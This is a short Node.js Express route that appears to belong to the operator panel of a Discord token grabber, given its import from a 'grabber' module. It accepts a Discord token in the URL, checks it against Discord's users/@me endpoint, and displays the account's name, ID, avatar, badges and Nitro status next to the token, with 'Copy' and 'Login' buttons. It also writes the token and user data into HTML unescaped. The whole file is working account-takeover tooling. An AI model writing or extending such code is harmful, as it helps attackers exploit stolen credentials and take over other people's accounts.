const config = require("../../config.json");
const { discord, badges, nitro } = require("../../assets/function/grabber/all.js");
module.exports = {
    path: "/token/:token",
    method: "get",
    go: async (req, res) => {
        const pp = req.params.token;
        if (!pp) return res.status(404).json({ error: { err: "[404] ERROR: Token introuvable." } });
        const info = await discord("https://discord.com/api/v9/users/@me", pp);
        if (!info) return res.status(404).json({ error: { err: "[404] ERROR: Token invalide." } });
        return res.render("content.ejs", {
            content: `<div class="content"><p><h1>${info.username}#${info.discriminator} (${info.id}) <br><img src="https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=128"></h1></p><span>Flags: ${await badges(info, pp)}<br>Nitro: ${await nitro(info.premium_type)}<br> Tokens:<br></span><span class="report">${pp}<br></span><p><form action="${config.domain}/copy/${pp}" method="get"><input type="submit" id="parse-btn" value="Copy"></form><form action="${config.domain}/login/${pp}" method="get"><input type="submit" id="parse-btn" value="Login"></form></p></div>`});
    }
}